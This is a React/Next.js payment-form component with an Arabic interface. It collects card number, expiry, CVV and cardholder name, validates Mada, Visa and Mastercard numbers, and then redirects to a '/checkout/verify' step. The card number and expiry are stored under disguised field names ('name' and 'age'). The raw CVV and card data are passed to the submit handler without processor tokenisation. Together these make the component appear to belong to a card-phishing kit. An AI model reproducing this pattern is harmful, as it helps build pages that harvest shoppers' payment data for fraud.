"use client";

import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { motion, AnimatePresence } from "framer-motion";
import { FaWifi } from "react-icons/fa";
import { IoChevronBack, IoLockClosedOutline, IoTimeOutline, IoCardOutline } from "react-icons/io5";
import cardValidator from "card-validator";
import { useCartStore } from "../../store/cartStore";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
}

export default function PaymentForm({ onSubmit }: PaymentFormProps) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [flipped, setFlipped] = useState(false);
  const getRateLimitStatus = useCartStore((s) => s.getRateLimitStatus);
  const recordOrder = useCartStore((s) => s.recordOrder);
  const [rateLimitMsg, setRateLimitMsg] = useState<string | null>(null);
  const [countdown, setCountdown] = useState("");
  const [serverBlocked, setServerBlocked] = useState(false);
  const [serverBlockedUntil, setServerBlockedUntil] = useState(0);

  const formatTime = useCallback((ms: number) => {
    const m = Math.floor(ms / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    return `${m}:${s.toString().padStart(2, "0")}`;
  }, []);

  useEffect(() => {
    const tick = () => {
      const { blocked, remainingMs } = getRateLimitStatus();
      const serverRemaining = serverBlockedUntil - Date.now();
      const isServerBlocked = serverBlocked && serverRemaining > 0;
      if (blocked || isServerBlocked) {
        const ms = blocked ? remainingMs : serverRemaining;
        setRateLimitMsg("عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً 🙏");
        setCountdown(formatTime(ms));
      } else {
        if (serverBlocked) setServerBlocked(false);
        setRateLimitMsg(null);
        setCountdown("");
      }
    };
    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, [getRateLimitStatus, formatTime, serverBlocked, serverBlockedUntil]);

  const MADA_BINS = new Set(["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"]);

  const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
    if (!num) return null;
    if (num.length >= 6 && MADA_BINS.has(num.slice(0, 6))) return "Mada";
    const { card } = cardValidator.number(num);
    if (!card) return null;
    if (card.type === "visa") return "Visa";
    if (card.type === "mastercard") return "Mastercard";
    return null;
  };

  const luhnCheck = (num: string) => {
    let sum = 0, shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  const isBlocked = !!rateLimitMsg;

  const handleNext = async () => {
    const { blocked, remainingMs } = getRateLimitStatus();
    if (blocked) { setRateLimitMsg("عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً 🙏"); setCountdown(formatTime(remainingMs)); return; }
    const rawCard = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]), expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) { setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY"); return; }
    if (expMonth < 1 || expMonth > 12) { setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12"); return; }
    const cardDate = new Date(2000 + expYear, expMonth - 1, 1);
    const currentMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    if (cardDate < currentMonth) { setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي"); return; }
    if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح"); return; }
    setExpiryError("");
    setLoading(true);
    try {
      recordOrder();
      await onSubmit(fields);
      router.push("/checkout/verify");
    } catch {
      setServerBlocked(true);
      setServerBlockedUntil(Date.now() + 5 * 60 * 1000);
    } finally { setLoading(false); }
  };

  const cardType = getCardType(fields.name.replace(/\s/g, ""));
  const displayNumber = fields.name || "0000 0000 0000 0000";
  const displayHolder = fields.cardHolder || "FULL NAME";
  const displayExpiry = fields.age || "MM/YY";

  const cardBg =
    cardType === "Mada" ? "from-[#1b5e20] via-[#2e7d32] to-[#388e3c]" :
    cardType === "Visa" ? "from-[#0d47a1] via-[#1565c0] to-[#1976d2]" :
    cardType === "Mastercard" ? "from-[#bf360c] via-[#d84315] to-[#e64a19]" :
    "from-[#1a237e] via-[#225EFF] to-[#1565c0]";

  const inputBase = "w-full rounded-xl px-4 py-3 text-sm text-gray-800 bg-white/60 backdrop-blur-sm border focus:outline-none transition-all duration-200 placeholder:text-gray-300";
  const inputOk = "border-[#225EFF]/15 focus:border-[#225EFF] focus:ring-2 focus:ring-[#225EFF]/10 focus:bg-white";
  const inputErr = "border-red-300 focus:border-red-400 focus:ring-2 focus:ring-red-100 bg-red-50/30";
  const inputClass = (field: keyof typeof fields, extraError?: string) =>
    `${inputBase} ${(errors && !fields[field]) || extraError ? inputErr : inputOk}`;

  return (
    <div className="space-y-5">
      {/* ── Card Preview ── */}
      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="w-full max-w-sm mx-auto"
        style={{ perspective: "1000px" }}
      >
        <div
          className="relative w-full transition-transform duration-700"
          style={{ transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", height: "clamp(180px, 50vw, 215px)" }}
        >
          {/* Front */}
          <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white p-5 sm:p-6 shadow-[0_20px_60px_rgba(34,94,255,0.35)] select-none overflow-hidden`} style={{ backfaceVisibility: "hidden" }} dir="ltr">
            {/* Grid pattern */}
            <div className="absolute inset-0 opacity-10" style={{ backgroundImage: "repeating-linear-gradient(0deg,transparent,transparent 30px,rgba(255,255,255,0.1) 30px,rgba(255,255,255,0.1) 31px),repeating-linear-gradient(90deg,transparent,transparent 30px,rgba(255,255,255,0.1) 30px,rgba(255,255,255,0.1) 31px)" }} />
            {/* Glow circles */}
            <div className="absolute -top-10 -right-10 w-40 h-40 bg-white/10 rounded-full blur-2xl" />
            <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-white/5 rounded-full blur-xl" />
            <div className="relative">
              <div className="flex justify-between items-start">
                <FaWifi className="rotate-90 opacity-40" size={18} />
                {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={48} height={24} className="object-contain brightness-200" />}
                {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={56} height={24} className="object-contain brightness-200" />}
                {!cardType && <IoCardOutline size={22} className="opacity-30" />}
              </div>
              <div className="mt-3 w-9 h-6 rounded-md bg-yellow-300/80 flex items-center justify-center">
                <div className="w-6 h-4 rounded-sm border border-yellow-500/60 grid grid-cols-3 gap-px p-0.5">
                  {[...Array(6)].map((_, i) => <div key={i} className="bg-yellow-500/50 rounded-[1px]" />)}
                </div>
              </div>
              <div className="mt-4 tracking-[0.2em] text-lg sm:text-xl font-mono font-semibold drop-shadow-sm">{displayNumber}</div>
              <div className="flex justify-between items-end mt-4">
                <div>
                  <p className="text-[9px] opacity-40 uppercase tracking-[0.15em]">Card Holder</p>
                  <p className="text-xs font-bold tracking-wide truncate max-w-[160px]">{displayHolder}</p>
                </div>
                <div className="text-right">
                  <p className="text-[9px] opacity-40 uppercase tracking-[0.15em]">Expires</p>
                  <p className="text-xs font-bold">{displayExpiry}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Back */}
          <div className={`absolute inset-0 rounded-2xl bg-gradient-to-br ${cardBg} text-white shadow-[0_20px_60px_rgba(34,94,255,0.35)] select-none overflow-hidden`} style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }} dir="ltr">
            <div className="w-full h-10 bg-black/60 mt-7" />
            <div className="px-6 mt-5">
              <p className="text-[9px] opacity-40 uppercase tracking-[0.15em] mb-1.5">CVV</p>
              <div className="bg-white/90 rounded-lg h-10 flex items-center px-4">
                <span className="text-gray-800 font-mono font-bold tracking-[0.3em] text-base">{fields.cvv ? "•".repeat(fields.cvv.length) : "•••"}</span>
              </div>
            </div>
            <div className="absolute bottom-4 right-6">
              {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={44} height={24} className="object-contain brightness-200 opacity-60" />}
              {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={52} height={24} className="object-contain brightness-200 opacity-60" />}
            </div>
          </div>
        </div>
      </motion.div>

      {/* ── Payment Form ── */}
      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3 }}
        className="bg-white/80 backdrop-blur-sm rounded-2xl border border-[#225EFF]/10 shadow-[0_4px_20px_rgba(34,94,255,0.07)] overflow-hidden"
      >
        {/* Form Header */}
        <div className="bg-gradient-to-r from-[#225EFF]/8 to-[#7FA8FF]/5 px-5 py-4 border-b border-[#225EFF]/8 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-gradient-to-br from-[#225EFF]/15 to-[#7FA8FF]/15 flex items-center justify-center border border-[#225EFF]/10">
              <IoLockClosedOutline size={13} className="text-[#225EFF]" />
            </div>
            <span className="text-xs font-bold text-gray-600">بيانات البطاقة البنكية</span>
          </div>
          <Image src="/فيزا ماستر مدى.webp" alt="Visa Mastercard Mada" width={90} height={28} className="object-contain" />
        </div>

        <div className="p-5 space-y-4">
          {/* Card Number */}
          <div>
            <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">رقم البطاقة</label>
            <div className="relative">
              <input
                autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19} dir="ltr" style={{ textAlign: "right" }}
                value={fields.name}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  setCardError("");
                }}
                className={`${inputClass("name", cardError)} pr-4 pl-14`}
              />
              {fields.name.replace(/\s/g, "").length >= 1 && (
                <span className="absolute left-3 top-1/2 -translate-y-1/2">
                  {cardType === "Visa" && (
                    <svg viewBox="0 0 48 16" width="44" height="14"><rect width="48" height="16" rx="3" fill="#1A1F71"/><text x="24" y="12" textAnchor="middle" fill="white" fontSize="11" fontWeight="bold" fontFamily="Arial">VISA</text></svg>
                  )}
                  {cardType === "Mastercard" && (
                    <svg viewBox="0 0 48 30" width="36" height="22"><circle cx="18" cy="15" r="12" fill="#EB001B"/><circle cx="30" cy="15" r="12" fill="#F79E1B"/><path d="M24 6.27a12 12 0 0 1 0 17.46A12 12 0 0 1 24 6.27z" fill="#FF5F00"/></svg>
                  )}
                  {cardType === "Mada" && (
                    <svg viewBox="0 0 48 20" width="44" height="18"><rect width="48" height="20" rx="3" fill="#4CAF50"/><text x="24" y="14" textAnchor="middle" fill="white" fontSize="10" fontWeight="bold" fontFamily="Arial">mada</text></svg>
                  )}
                  {!cardType && <span className="text-[10px] font-bold text-gray-300">غير معروف</span>}
                </span>
              )}
            </div>
            {cardError && <p className="text-red-400 text-xs font-bold mt-1.5">{cardError}</p>}
          </div>

          {/* Expiry + CVV */}
          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">تاريخ الانتهاء</label>
              <input
                autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
                value={fields.age}
                onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
                className={inputClass("age", expiryError)}
              />
              {expiryError && <p className="text-red-400 text-xs font-bold mt-1.5">{expiryError}</p>}
            </div>
            <div>
              <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">رمز CVV</label>
              <input
                autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
                value={fields.cvv}
                onFocus={() => setFlipped(true)}
                onBlur={() => setFlipped(false)}
                onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); setCvvError(""); }}
                className={inputClass("cvv", cvvError)}
              />
              {cvvError && <p className="text-red-400 text-xs font-bold mt-1.5">{cvvError}</p>}
            </div>
          </div>

          {/* Card Holder */}
          <div>
            <label className="flex items-center gap-1.5 text-xs font-bold text-[#225EFF]/70 uppercase tracking-wide mb-1.5">اسم حامل البطاقة</label>
            <input
              autoComplete="cc-name" type="text" placeholder="FULL NAME"
              value={fields.cardHolder}
              onChange={e => { const v = e.target.value.replace(/[^a-zA-Z ]/g, ""); setFields(f => ({ ...f, cardHolder: v.toUpperCase() })); }}
              className={inputClass("cardHolder")}
            />
          </div>
        </div>
      </motion.div>

      {/* ── Rate Limit Warning ── */}
      <AnimatePresence>
        {isBlocked && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="bg-amber-50 border border-amber-200 rounded-2xl p-5 text-center space-y-2"
          >
            <div className="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center mx-auto">
              <IoTimeOutline size={24} className="text-amber-600" />
            </div>
            <p className="text-sm font-bold text-amber-800">{rateLimitMsg}</p>
            <div className="bg-white rounded-xl py-2 px-4 inline-block border border-amber-100">
              <p className="text-xs text-amber-500 font-medium">يمكنك المحاولة بعد</p>
              <p className="text-2xl font-extrabold text-amber-700 mt-0.5">{countdown}</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ── Action Buttons ── */}
      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.4 }}
        className="flex gap-3"
      >
        <button
          onClick={() => router.push("/cart")}
          className="flex items-center justify-center gap-1.5 w-[120px] bg-white/80 backdrop-blur-sm border border-[#225EFF]/15 text-gray-500 font-bold py-3.5 rounded-xl text-sm hover:bg-white hover:border-[#225EFF]/30 transition-all"
        >
          <IoChevronBack size={16} className="rotate-180" />
          السابق
        </button>
        <motion.button
          whileHover={isBlocked ? {} : { scale: 1.01, y: -1 }}
          whileTap={isBlocked ? {} : { scale: 0.98 }}
          onClick={handleNext}
          disabled={loading || isBlocked}
          className={`flex-1 relative overflow-hidden font-bold py-3.5 rounded-xl text-sm transition-all duration-300 flex items-center justify-center gap-2 ${
            isBlocked
              ? "bg-gray-200 text-gray-400 cursor-not-allowed"
              : "bg-gradient-to-r from-[#225EFF] to-[#7FA8FF] text-white shadow-[0_8px_30px_rgba(34,94,255,0.35)] hover:shadow-[0_12px_40px_rgba(34,94,255,0.5)] disabled:opacity-60 disabled:cursor-not-allowed"
          }`}
        >
          {loading ? (
            <>
              <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
              جاري المعالجة...
            </>
          ) : isBlocked ? (
            "يرجى الانتظار"
          ) : (
            <>
              <IoLockClosedOutline size={16} />
              تأكيد الدفع
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/15 to-transparent -translate-x-full animate-[shimmer_2.5s_infinite]" />
            </>
          )}
        </motion.button>
      </motion.div>
    </div>
  );
}
